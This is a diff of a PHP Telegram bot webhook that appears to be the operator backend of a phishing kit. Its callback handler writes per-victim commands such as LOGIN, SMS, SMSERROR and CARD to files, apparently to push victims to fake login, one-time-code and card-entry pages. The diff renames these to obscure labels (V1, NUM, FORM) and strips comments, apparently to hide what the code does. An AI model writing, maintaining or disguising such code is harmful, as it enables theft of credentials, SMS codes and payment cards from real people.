@@ -1,12 +1,11 @@
 <?php
-// ===== bot.php =====
 include("settings.php");
 
 $content = file_get_contents("php://input");
 $update = json_decode($content, true);
 
 if (isset($update['callback_query'])) {
-    $data = $update['callback_query']['data']; // Ej: "SMS|usuario123"
+    $data = $update['callback_query']['data'];
     $chat_id = $update['callback_query']['message']['chat']['id'];
     $callback_id = $update['callback_query']['id'];
 
@@ -20,30 +19,14 @@ if (isset($update['callback_query'])) {
         $archivo = "acciones/$usuario.txt";
 
         switch ($comando) {
-            case "SMS":
-                file_put_contents($archivo, "/SMS");
-                break;
-            case "SMSERROR":
-                file_put_contents($archivo, "/SMSERROR");
-                break;
-            case "NUMERO":
-                file_put_contents($archivo, "/NUMERO");
-                break;
-            case "ERROR":
-                file_put_contents($archivo, "/ERROR");
-                break;
-            case "LOGIN":
-                file_put_contents($archivo, "/LOGIN");
-                break;
-            case "LOGINERROR":
-                file_put_contents($archivo, "/LOGINERROR");
-                break;
-            case "CARD":
-                file_put_contents($archivo, "/CARD");
-                break;
-            default:
-                file_put_contents($archivo, "/ERROR");
-                break;
+            case "V1": file_put_contents($archivo, "/v1"); break;
+            case "V1ERROR": file_put_contents($archivo, "/v1error"); break;
+            case "NUM": file_put_contents($archivo, "/n1"); break;
+            case "ERR": file_put_contents($archivo, "/retry"); break;
+            case "INICIO": file_put_contents($archivo, "/inicio"); break;
+            case "ERR1": file_put_contents($archivo, "/err1"); break;
+            case "FORM": file_put_contents($archivo, "/form"); break;
+            default: file_put_contents($archivo, "/retry"); break;
         }
 
         file_get_contents("https://api.telegram.org/bot$token/answerCallbackQuery?" . http_build_query([
